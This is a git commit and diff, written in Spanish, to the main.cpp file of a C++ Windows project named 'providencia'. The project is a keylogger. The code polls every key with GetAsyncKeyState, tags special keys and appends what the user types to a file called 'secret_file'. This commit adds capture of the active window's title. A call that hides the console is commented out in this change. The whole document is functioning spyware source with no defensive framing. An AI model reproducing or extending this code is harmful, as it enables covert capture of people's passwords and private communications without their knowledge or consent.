4f7bd556fff425bf8d22f50c5142e2ee958a0260
SergioRAlvarezP <sergioralvarezp@hotmail.com>
2019-09-05 19:56:00 -0500

    Se agregó código para obtener el título de la ventana activa.

--- providencia/providencia/main.cpp
+++ providencia/providencia/main.cpp
@@ -17,18 +17,22 @@ bool TeclasPulsadas(int tecla) {
 	case VK_SPACE:
 		cout << " ";
 		EscribirArchivo(" ");
+		return true;
 		break;
 	case VK_RETURN:
 		cout << "\n";
 		EscribirArchivo(" {INTRO} ");
+		return true;
 		break;
 	case VK_SHIFT:
 		cout << " {SHIFT} ";
 		EscribirArchivo(" {SHIFT} ");
+		return true;
 		break;
 	case VK_BACK:
 		cout << " {RETROCESO} ";
 		EscribirArchivo(" {RETROCESO} ");
+		return true;
 		break;
 
 	default: return false;
@@ -36,13 +40,20 @@ bool TeclasPulsadas(int tecla) {
 }
 
 int main() {
-	FreeConsole();
+	//FreeConsole();
 	unsigned char key;
 	while (TRUE) {
 		Sleep(10);
 		for (key = 8; key <= 255; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
 				if (TeclasPulsadas(key) == FALSE) {
+					HWND ventana = NULL;
+					ventana = GetForegroundWindow(); //Ventana activa que tiene capturada la entrada del teclado
+					const int SizeOfTitleBarText = GetWindowTextLength(ventana);
+					char *wnd_title = (char*)malloc(SizeOfTitleBarText+1);
+					GetWindowText(ventana, wnd_title, SizeOfTitleBarText+1);
+					cout << wnd_title;
+
 					cout << key;
 					ofstream archivo;
 					archivo.open("secret_file", fstream::app);
